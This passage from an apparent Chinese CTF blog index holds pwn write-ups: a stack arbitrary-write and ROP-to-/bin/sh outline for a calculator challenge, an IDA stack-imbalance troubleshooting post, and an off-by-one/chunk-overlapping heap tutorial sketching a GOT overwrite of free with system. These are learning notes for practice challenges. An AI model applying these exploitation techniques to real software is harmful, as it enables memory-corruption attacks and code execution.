比如我输入了1+2，那么，num[0]的值为2，如果输入+2，num[0]的值为1。</p>\n<p>​        所以根据这个计算的逻辑，如果输入+50，num[0]是1，num[1]是50，num[*num-1]就是num[1-1] = num[0] = num[0] + num[1]=50。</p>\n<p>​        如果输入的是+50+1，处理第一个加号时，num[0] = 2,num[1] = 50 ,num[2].= 1，</p>\n<p>然后num[1] += num[2] =&gt; num[1] = 51，接着处理第二个加号，也就是,num[50] += num[51]。</p>\n<p>​        num[51]显然应该是一个栈上的还没有被利用到的位置，但是这样我们已经能够将其覆盖为任意内容了，四舍五入形成了一个栈上任意地址读。</p>\n<p>​        然后后面还有一个对数组的内容的输出，相当于栈上任意地址写。</p>\n<p>​        这样我们就找到了不通过栈溢出而对栈上地址进行任意读写的方法，但想要控制程序执行流，我们注意到，存放进行计算的数字的数组不算很大，完全能够填写东西覆盖返回地址。</p>\n<p>​        </p>\n<p>​        <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-02%20%E4%B8%8B%E5%8D%8811.57.33.png\" data-caption=\"截屏2021-12-02 下午11.57.33\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-02%20%E4%B8%8B%E5%8D%8811.57.33.png\" alt=\"截屏2021-12-02 下午11.57.33\"></a></p>\n<p>​            </p>\n<p>​        </p>\n<p>​        也就是0x5A0 + 0x4 = 0x5A4 = 1444。数组存放int类型，32位下一个int占4个字节，所以返回地址所在的位置是idx[1444/4=361]</p>\n<p>​        也就是说如果我们能够将想要的东西写入idx[361]就能控制程序执行流。但是并不能ret2libc，所以需要在栈上手动构造寄存器状态来进行系统调用。</p>\n<p>​        所以我们需要的并不是在idx[361]上填某个值，而是需要连续修改这之后一串的空间来进行rop。</p>\n<p>​        借一张图来表示我们需要的布栈状况：</p>\n<p>​        <a href=\"https://v1ckydxp.github.io/images/stack.jpg\" data-caption=\"stack\" data-fancybox=\"images\"><img src=\"https://v1ckydxp.github.io/images/stack.jpg\" alt=\"stack\"></a></p>\n<p>​        </p>\n<p>​        其他的gadgets都可以通过ROPgadget来找到，但是字符串<code>\"/bin/sh\"</code>需要输入并确定它们在栈上的地址。</p>\n<p>​        <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8A%E5%8D%8812.45.13.png\" data-caption=\"截屏2021-12-03 上午12.45.13\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8A%E5%8D%8812.45.13.png\" alt=\"截屏2021-12-03 上午12.45.13\"></a></p>\n<p>​    </p>\n<p>​        对于这个地址，首先我们可以利用我们之前的栈上任意地址读写的能力泄露calc函数的ebp地址，也即是idx[360]    ,但是我们需要的字符串是在main函数调用栈中的，所以我们需要知道main函数调用栈的esp。</p>\n<p>​        通过观察可以发现main的esp正好就是idx[361],而calc ebp和main esp的关系如下：</p>\n<pre><code class=\"asm\">     mov     ebp, esp\n  and     esp, 0FFFFFFF0h\n    sub     esp, 10h\n</code></pre>\n<p>​        也即是我们可以通过calc ebp的值来求出main esp，从而通过偏移获得<code>\"/bin/sh\"</code>的地址。</p>\n<p>​        然后根据布栈将地址依次写入栈中就行。</p>\n</body></html>","tags":["pwnable"]},{"title":"positive sp value has been found","url":"/2021/12/10/ida%207.0%20for%20mac%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87%EF%BC%9A%20positive%20sp%20value%20has%20been%20found/","content":"<html><head></head><body><h2 id=\"\"><a class=\"post-anchor\" href=\"#\"></a></h2><h3 id=\"0）\">0）<a class=\"post-anchor\" href=\"#0）\"></a></h3><p>​        自从抛弃虚拟机，利用ida for mac+pwndocker实现完全mac环境以后，深觉优雅的同时，也遇见了不少坑。</p>\n<p>​        其中ida的坑更是坑人于无形之中。因为如果不打开win的7.5（甚至7.6）做对比，你甚至不知道你遇见的一些奇怪的东西，是7.0 mac版特有的，已经被优化了的坑，还是自身逆向水平问题。</p>\n<p>​        作为一个逆向废物，7.0 for mac属实是给本来就逆不出的我雪上加霜，但是就算是这样，我也宁愿花时间解决问题，而不是重新回到虚拟机win的悲惨过往，因为这不优雅。（优雅这个词到底害死了多少人捏）</p>\n<h3 id=\"1）\">1）<a class=\"post-anchor\" href=\"#1）\"></a></h3><p>​        目前碰到的最多的一个问题，就是：</p>\n<p>​        <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-10%20%E4%B8%8B%E5%8D%884.13.01.png\" data-caption=\"截屏2021-12-10 下午4.13.01\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-10%20%E4%B8%8B%E5%8D%884.13.01.png\" alt=\"截屏2021-12-10 下午4.13.01\"></a></p>\n<p>​        其实这个严格来讲算不上问题，因为你只需要找到main函数再f5，照样能够反编译，但是每次弹出的这个框就让我很恼火。所以解决问题的目标在于修改ida使得不再弹出这个框，而不是修改程序治标不治本捏。</p>\n<p>​        对于问题本身，其实还是比较常规，只需要patch一下就好了。</p>\n<p>​        我这里是<code>_start()</code>堆栈不平衡，</p>\n<p>​                <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-10%20%E4%B8%8B%E5%8D%884.22.48.png\" data-caption=\"截屏2021-12-10 下午4.22.48\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-10%20%E4%B8%8B%E5%8D%884.22.48.png\" alt=\"截屏2021-12-10 下午4.22.48\"></a></p>\n<p>​        问题显然出在<code>and     rsp, 0FFFFFFFFFFFFFFF0h</code>到<code>start</code>结束的这一大段。call完main以后居然没有retn。<a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-10%20%E4%B8%8B%E5%8D%884.27.29.png\" data-caption=\"截屏2021-12-10 下午4.27.29\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-10%20%E4%B8%8B%E5%8D%884.27.29.png\" alt=\"截屏2021-12-10 下午4.27.29\"></a></p>\n<p>​        首先报堆栈不平衡的错误大概就是因为ida要求stack pointer在函数开头和结束时相等。然后导致堆栈不平衡，通常是因为程序本身含有代码混淆/花指令，但是这是一道pwn题，为什么要在这种地方为难人。</p>\n<p>​        我超，流汗黄豆原来是为难的意思。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-10%20%E4%B8%8B%E5%8D%885.07.12.png\" data-caption=\"截屏2021-12-10 下午5.07.12\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-10%20%E4%B8%8B%E5%8D%885.07.12.png\" alt=\"截屏2021-12-10 下午5.07.12\"></a></p>\n<p>​        </p>\n<p>​        首先最让我疑惑的就是末尾的hlt指令，它取代了retn，然后它的意思是暂停指令，而不是返回。为什么这个地方会有一条这样的指令，是程序原本设计的还是ida反编译的问题？</p>\n<p>​        稍微学习了一下，意识到start函数是被拆成了三个部分，所以只反编译一个部分肯定有问题。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-10%20%E4%B8%8B%E5%8D%885.17.51.png\" data-caption=\"截屏2021-12-10 下午5.17.51\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-10%20%E4%B8%8B%E5%8D%885.17.51.png\" alt=\"截屏2021-12-10 下午5.17.51\"></a></p>\n<p>​        但是虽然这样堆栈平衡，但是还是无法反编译，我也不清楚里面是不是有什么花指令。</p>\n<p>​        和胖爷爷交流了一下，7.5及以上也会出现这个错误，但是完全可以反编译，并且start就是只有那么一段，没有后面的一堆东西。我不理解，我也修复不了，这篇文章毫无意义，但是学习了一些修复堆栈不平衡的方法（</p>\n<h3 id=\"）参考\">）参考<a class=\"post-anchor\" href=\"#）参考\"></a></h3><p>​        <a href=\"https://blog.csdn.net/lixiangminghate/article/details/78820388\">IDA出现”sp-analysis failed”和F5(反编译)失败</a></p>\n<p>​        </p>\n</body></html>","tags":["逆向"]},{"title":"off by one /chunk overlapping","url":"/2021/12/08/off%20by%20one/","content":"<html><head></head><body><h2 id=\"Off-by-one\">Off by one<a class=\"post-anchor\" href=\"#Off-by-one\"></a></h2><p>​        单/空字节溢出攻击。</p>\n<p>​        通常来说简单的off by one的漏洞点来自于编写时对边界控制不严格，导致每次输入的字符都能比规定的最大字符大那么一些（一个，或者几个）。这些字节溢出到物理地址相邻的下一个堆块，就能修改下一个chunk的size或者<code>prev_inuse</code>，通过这样的溢出，就能够整一些有趣的攻击。</p>\n<p>​        通常单字节溢出的利用方式有如下几种：</p>\n<ol>\n<li>溢出字节任意可控制字节：修改chunk size，造成堆叠，泄露或覆盖其他块的数据</li>\n<li>溢出空字节：修改下一个chunk的<code>prev_inuse</code>，使得当前chunk状态为free，然后就可以：1）利用unlink进行攻击。2）对于下一个chunk来说，前一个chunk状态为free，自身的prev_size域启用，就能够伪造<code>prev_size</code>，改变前一个chunk的size，造成堆叠。</li>\n</ol>\n<p>​        </p>\n<p>​        从ctf-wiki上的一个简单的小例子开始：</p>\n<pre><code class=\"c\">int my_gets(char *ptr,int size)\n{\n    int i;\n    for(i=0;i&lt;=size;i++)#栅栏错误\n    {\n        ptr[i]=getchar();\n    }\n    return i;\n}\nint main()\n{\n    void *chunk1,*chunk2;\n    chunk1=malloc(16);\n    chunk2=malloc(16);\n    puts(\"Get Input:\");\n    my_gets(chunk1,16);\n    return 0;\n}\n</code></pre>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%882.09.13.png\" data-caption=\"截屏2021-12-08 下午2.09.13\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%882.09.13.png\" alt=\"截屏2021-12-08 下午2.09.13\"></a>        </p>\n<p>可以看到0x1994020的最低位被覆盖为了“61”，也就是a的小端序。当然这里是因为前一个chunk属于已分配状态，所以下一个chunk的<code>prev_size</code>被内存复用为了前一个chunk的内容。</p>\n<p>以及这个字符串操作的例子</p>\n<pre><code class=\"c\">int main(void)\n{\n    char buffer[40]=\"\";\n    void *chunk1;\n    chunk1=malloc(24);\n    puts(\"Get Input\");\n    gets(buffer);\n    if(strlen(buffer)==24)\n    {\n        strcpy(chunk1,buffer);\n    }\n    return 0;\n\n}\n\n</code></pre>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%882.30.56.png\" data-caption=\"截屏2021-12-08 下午2.30.56\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%882.30.56.png\" alt=\"截屏2021-12-08 下午2.30.56\"></a></p>\n<p>![截屏2021-12-08 下午2.32.03](/Users/rin/Library/Application Support/typora-user-images/截屏2021-12-08 下午2.32.03.png)</p>\n<p>这样next chunk的最低位就被0覆盖了。</p>\n<h3 id=\"chunk-overlapping\">chunk overlapping<a class=\"post-anchor\" href=\"#chunk-overlapping\"></a></h3><p>​        off by one的一个比较简单的利用就是chunk overlapping，简单讲就是通过溢出将chunk的size位修改，导致几个连续的chunk的内存空间发生了重叠，借此可以泄露一些数据或者覆盖chunk指针。</p>\n<p>​        在举例子之前先复习一下与chunk size有关的一些操作。</p>\n<p>​        获取当前chunk size ：通过堆指针的直接获取size位</p>\n<p>​        获取当前chunk的use状态：通过当前chunk bp+chunk size获取下一个chunk的bp，然后获得prev_inuse位。</p>\n<p>​        获取前一个chunk size  ：利用当前chunk指针获取当前chunk的prev size。</p>\n<p>​        获取下一个chunk的地址 ：利用当前chunk的size，下一个chunk地址即为：当前chunk指针+size。</p>\n<p>​        获取前一个chunk的信息：先通过prev_size算出前一个chunl的堆指针，然后再利用前一个chunk的对指针来获得相关信息。</p>\n<h4 id=\"HITCON-Trainging-lab13\">HITCON Trainging lab13<a class=\"post-anchor\" href=\"#HITCON-Trainging-lab13\"></a></h4><p><a href=\"https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13\">题目链接</a></p>\n<h5 id=\"逆向\">逆向<a class=\"post-anchor\" href=\"#逆向\"></a></h5><p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%888.42.17.png\" data-caption=\"截屏2021-12-08 下午8.42.17\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%888.42.17.png\" alt=\"截屏2021-12-08 下午8.42.17\"></a></p>\n<p>​        <code>edit()</code>中，可以输入的字符比规定的多了一个字节。</p>\n<p>​        程序并没有其他非常规的操作，就是单纯的off by one+chunk overlapping的利用。</p>\n<pre><code class=\"c\">#思路如下\nadd chunk0#0x18\nadd chunk1#0x10\nedit chunk1 size to 0x41\nfree chunk1\nadd chunk2#size = 0x30\n</code></pre>\n<p>​        对于每个heap，程序会申请0x10作为heap结构，然后再申请size大小作为content。</p>\n<pre><code class=\"python\">create(0x18, \"dada\")  # 0\ncreate(0x10, \"ddaa\")  # 1\n这样操作以后内存应该是\nchunk0/struct #0x10\nchunk0/content #0x18\nchunk1/struct#0x10\nchunk1/content#0x10\n</code></pre>\n<p>​        申请的chunk0为0x18，原因是chunk都处于allocated状态，下一个chunk的<code>prev_size</code>无效，所以会被上一个chunk给内存复用。所以这里0x18是0x10的chunk0和0x8的chunk1的prevsize域。</p>\n<p>申请两个heap后内存布局如图。</p>\n<p>00-20是heap1的struct，20-40是heap1 content，其中，heap1 struct保存了指向heap1 content的指针。然后40-60是heap2 struct，60-80是heap2 content。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%889.23.24.png\" data-caption=\"\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%889.23.24.png\" alt=\"\"></a></p>\n<p>​        通过<code>edit(0, \"/bin/sh\\x00\" + \"a\" * *0x*10 + \"\\x41\")</code>将chunk1的size覆盖为0x41。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%888.59.28.png\" data-caption=\"截屏2021-12-08 下午8.59.28\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%888.59.28.png\" alt=\"截屏2021-12-08 下午8.59.28\"></a>        </p>\n<p>​        然后释放chunk1。</p>\n<p>​        释放chunk1后的内存如图。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%8810.45.36.png\" data-caption=\"截屏2021-12-08 下午10.45.36\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%8810.45.36.png\" alt=\"截屏2021-12-08 下午10.45.36\"></a></p>\n<p>​    48开始可以直接理解为一个0x41的内存块。申请一个0x30的chunk2，属于fastbin，直接找到上次释放的0x41的chunk1分配给heap2，从048开始储存。我们的目的是修改chunk在结构chunk中保存content ptr为<code>free_got_addr</code>,并且要show（）出来，就要确保<code>free_got_addr</code>的位置是原来chunk1content开始的位置，也就是078。</p>\n<p>​        所以只需要利用chunk2，在合适的地方将free got addr填写到chunk1的content ptr处，chunk2的size是多少其实关系不大，只要大于8就行。</p>\n<p>​        当chunk1的content ptr被覆盖成了free got addr，show（1）实际上是读取这个ptr指向的地址的内容，也就是free的真实地址。同时也就相当于把chunk1的content ptr变为了free的真实地址，所以我们只需要修改chunk1的content，就能修改free的真实地址，将我们获得的<code>system()</code>的地址替换就行。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%889.31.45.png\" data-caption=\"截屏2021-12-08 下午9.31.45\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%889.31.45.png\" alt=\"截屏2021-12-08 下午9.31.45\"></a></p>\n<p>​        这样我们就获得了system·函数，要执行这个函数，只需要free一个含字符串<code>\"/bin/sh\"</code>的堆。也就是我们最开始add的工具人堆chunk0.</p>\n<p>​        这样基本就清楚了，但是还有一个问题我不是很理解，为什么在add chunk2的时候，chunk2的结构chunk的size位为0.或者说感觉根本没有结构chunk。</p>\n<h5 id=\"一些mzr\">一些mzr<a class=\"post-anchor\" href=\"#一些mzr\"></a></h5><p>​        我超，我大彻大悟了。原来这么半年我一直理解错了何为堆叠。我理解错了啊！其实堆叠在动调中是看不到的，因为两个chunk完全被叠在了一起，就像我修改了chunk1的size1为41，这样heap1 struct和heap1 content就被叠成了0x41的空间，是叠成了0x41而不是struct把content覆盖了，如果这个时候申请内存空间的话，被叠起来的0x20的原本的content还是能够被申请到，所以我为什么chunk2的结构chunk离奇消失，就是因为被叠起来的0x20给隐藏了，然后再通过构造chunk2的content来伪造一个heap2struct，一切就说得通。</p>\n<p>​        再稍微细节一些，从代码中我们可以发现当我们free被堆叠的chunk1时，其实这个过程释放了两个chunk，一个是结构体chunk，是0x20size，另外一个是被修改为0x41的struct，然后两个chunk释放的先后顺序是先释放content，再释放struct，也就是fastbin中顺序是<code> struct（0x41）=&gt;content(0x20)</code></p>\n<p>​        这时候申请0x30的chunk2，首先需要申请0x20的struct，也就是被堆叠的heap1的content（这里存疑，如果fastbin的适配是smallest fit，那无话可说，但是似乎是first fit），然后再申请0x30的content，也就是被修改的0x41，这样就说得通了。</p>\n<p>​        但是很奇怪的一点，ctf-wiki上的说法却和这个不太一样，他认为将struct的size修改为0x41再free后，content就被struct吞并，而不是折叠了，free也只free一个0x41的chunk，而不是两个chunk。这个有待验证。</p>\n<p>​        我想通了，同时释放两个chunk是题目特地设置的，并且是必须要先释放content再释放struct才能达到效果。如果是先释放struct，0x41就会把content的所有chunk头之类的一并认为是user space然后释放，这样也就不存在content，自然就只释放一个堆块了。</p>\n<h5 id=\"一些动调\">一些动调<a class=\"post-anchor\" href=\"#一些动调\"></a></h5><p>​        exp打了。发现打不通。动调发现free的got表确实被被修改成<code>system()</code>，但是调用的时候似乎出现了问题，</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-09%20%E4%B8%8A%E5%8D%8810.32.49.png\" data-caption=\"截屏2021-12-09 上午10.32.49\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-09%20%E4%B8%8A%E5%8D%8810.32.49.png\" alt=\"截屏2021-12-09 上午10.32.49\"></a></p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-09%20%E4%B8%8A%E5%8D%8810.51.22.png\" data-caption=\"截屏2021-12-09 上午10.51.22\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-09%20%E4%B8%8A%E5%8D%8810.51.22.png\" alt=\"截屏2021-12-09 上午10.51.22\"></a></p>\n<p>​        先检查问题是不是出现在<code>edit()</code>上</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-09%20%E4%B8%8A%E5%8D%8810.42.21.png\" data-caption=\"截屏2021-12-09 上午10.42.21\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-09%20%E4%B8%8A%E5%8D%8810.42.21.png\" alt=\"截屏2021-12-09 上午10.42.21\"></a></p>\n<p>​        跟进<code>edit()</code>，可以看到堆结构岿然不动，但是这是正常的。因为被修改的应该是free的got表，显然那种东西不会在这里。        </p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-09%20%E4%B8%8A%E5%8D%8810.44.47.png\" data-caption=\"截屏2021-12-09 上午10.44.47\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-09%20%E4%B8%8A%E5%8D%8810.44.47.png\" alt=\"截屏2021-12-09 上午10.44.47\"></a></p>\n<p>​        rdi指向free的got表地址，got指向真实地址，似乎没有任何问题。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-09%20%E4%B8%8A%E5%8D%8810.54.46.png\" data-caption=\"截屏2021-12-09 上午10.54.46\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-09%20%E4%B8%8A%E5%8D%8810.54.46.png\" alt=\"截屏2021-12-09 上午10.54.46\"></a></p>\n<p>​        我悟了，问题所在就是，就是啥呢，就是我本地libc的符号和程序使用的对不上。所以getshell失败。好了，我爬了。</p>\n<p>​        </p>\n<p>​        （所以远端也打不通的原因是？）</p>\n<h4 id=\"Asis-CTF-2016-b00ks\"><a href=\"https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks\">Asis CTF 2016 b00ks</a><a class=\"post-anchor\" href=\"#Asis-CTF-2016-b00ks\"></a></h4><p>Checksec:</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%883.40.30.png\" data-caption=\"截屏2021-12-08 下午3.40.30\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%883.40.30.png\" alt=\"截屏2021-12-08 下午3.40.30\"></a></p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%883.49.14.png\" data-caption=\"截屏2021-12-08 下午3.49.14\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%883.49.14.png\" alt=\"截屏2021-12-08 下午3.49.14\"></a></p>\n<p>​        代码的逻辑相对来说有一些复杂，但是还是比较好逆的，管理book的结构体大概长这样：</p>\n<pre><code class=\"c\">struct booklist{\n  int idx;\n  char *name;\n  char *description;\n  int size;\n}\n</code></pre>\n<p>​        然后就是常规的菜单题的逻辑，也没有后门函数，估计需要ret2libc。值得注意的是：保护除了canary，其他都开了，这样的意义我尚且不清楚。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%884.39.02.png\" data-caption=\"截屏2021-12-08 下午4.39.02\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%884.39.02.png\" alt=\"截屏2021-12-08 下午4.39.02\"></a></p>\n<p>但是又联系到作者的名字是存贮在栈上的，也许可以利用。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%884.42.56.png\" data-caption=\"截屏2021-12-08 下午4.42.56\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%884.42.56.png\" alt=\"截屏2021-12-08 下午4.42.56\"></a></p>\n<p>​        <code>    my_read</code>函数有一个疑点就是每一次输入完成以后都会将buf的开始的地址至0。也就是每个利用到<code>my_read()</code>的地址，开头一个字节都是0。</p>\n<p>​        为了验证这一操作，我们动态调试一下。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%884.59.56.png\" data-caption=\"截屏2021-12-08 下午4.59.56\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%884.59.56.png\" alt=\"截屏2021-12-08 下午4.59.56\"></a></p>\n<p>​        操作没有验证到，反而发现一个很怪的东西，就是储存name和des的chunk的size并不是我们输入的，而是限定的0x20，也就是32。这样就对应了add函数最的一段：</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%885.01.29.png\" data-caption=\"截屏2021-12-08 下午5.01.29\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%885.01.29.png\" alt=\"截屏2021-12-08 下午5.01.29\"></a></p>\n<p>​        对着伪代码摁逆确实没什么思路，但是动调一下思路就清晰了，程序将原本储存name或者des的堆指针赋给了size为0x20的chunk。但是这么做的目的何在？</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%885.17.28.png\" data-caption=\"截屏2021-12-08 下午5.17.28\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%885.17.28.png\" alt=\"截屏2021-12-08 下午5.17.28\"></a></p>\n<p>​        没辙了，没有一点思路。</p>\n<p>​        （偷偷看一眼wp，只看逆向部分）</p>\n<p>​        <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%885.26.54.png\" data-caption=\"截屏2021-12-08 下午5.26.54\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%885.26.54.png\" alt=\"截屏2021-12-08 下午5.26.54\"></a></p>\n<p>​        （不懂，为什么对于边界的考虑不当，我觉得挺当的qwq。wp说存在空字节溢出，那估计又是我想错了。呜呜，我想通了。就是这个*buf = 0，我是傻逼。）</p>\n<p>​        其实是最后一位被清0了，但是我一直想的是原本的buf的开始被清0。现在想通了，其实特别简单，就是当i等于32的时候，buf还自增了，然后才判结束循环，这时候又将末位置0，就相当于多输了一个0，造成了空字节溢出。</p>\n<p>​        （wp关闭，开始瞎写时间）</p>\n<p>ToBeContinue</p>\n<h3 id=\"总结\">总结<a class=\"post-anchor\" href=\"#总结\"></a></h3><p>稍微总结一下昨天的学习吧。</p>\n<p>其实虽然做了大概十个小时，但是只做了三个题不到，其中有大段时间在修复崩坏的环境以及研究pwndocker的一些问题，还有无谓的逆向，结果做不出。</p>\n<p>并且对于hicton lab 13这道题 ，一个简单的概念卡了我很久。</p>\n<p>现在看来，原因有2:我没有认真逆向。错过了很多我不以为意的内容，pwn题只要一个细节没有注意到就会被坑很久，所以还是那个老生常谈的话题，逆向。其实这个问题一方面是我逆向太不认真了，还有一方面是刷的题太少，甚至没办法总结规律。比如通过这两道题我总结出来的规律是：一般在普通的ptr = malloc（）之外还会特地创建一个struct用来管理每个表项的结构（我早就应该想到的），这个结构中通常会储存堆中的指针（我早就应该知道的，但是不知道为什么，我半年来一直没有意识到这个问题），所以我们覆盖的其实是堆struct chunk中储存的chunk bp，而不是实际的chunk bp（那个储存在哪里都不清楚捏）。</p>\n<p>然后就是还是对chunk以及bin的一些操作或者说数据结构不是非常了解，导致概念不清。所以我暂停一天刷题，然后把malloc lab的分离适配搞完。</p>\n<p>​        </p>\n<p>​        </p>\n<p>​        </p>\n</body></html>","tags":["heap_pro"]},{"title":"Assembly_Refresher","url":"/2022/01/29/pwncollege_Assembly_Refresher/","content":"<html><head></head><body><h4 id=\"Level1\">Level1<a class=\"post-anchor\" href=\"#Level1\"></a></h4><p>需要设置<code>*rdi = 